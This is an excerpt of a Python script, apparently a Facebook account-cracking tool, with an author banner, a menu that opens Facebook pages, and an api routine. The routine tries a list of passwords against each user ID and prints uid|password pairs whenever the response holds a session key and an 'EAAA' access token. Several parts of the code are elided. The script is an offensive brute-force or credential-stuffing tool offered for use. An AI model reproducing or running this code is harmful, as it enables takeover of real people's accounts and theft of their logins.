#THE TOOL CREATED BY ATIK
#Team Justice-TJ
#FB : https://www.facebook.com/md.Atikur.Islam2009
#PAGE : Atik Hasan 
#Programer Md Atikur Islam 
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +880171503013
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 Atik 𝐇𝐚𝐜𝐤𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬

\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : Atik Hasan  
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : Md Atikur Islam 
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : ATIK-HASAN
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +880171503013
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       : Team Justice -TJ
║\33[1;32m[↦] 𝚅𝙴𝚁𝚂𝙸𝙾𝙽    : 0.118.0
╚════════════════════════════════════════╝
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/ses.jamanar.ummat/')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is ATIK ")
			print("")
			input("\n\033[1;32m   ENTER MY FACEBOOK PAGE NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By ATIK HASAN ")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		...
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/ses.jamanar.ummat/')
		if DEVIL in ["4", "04"]:
			os.system('xdg-open https://www.facebook.com/groups/590005482506415/')
		if DEVIL in ["5",  "05"]:
			self.old2()
			exit()
		else:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[a] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [ATIK] %s | %s\033[1;32m         "%(uid, pw))
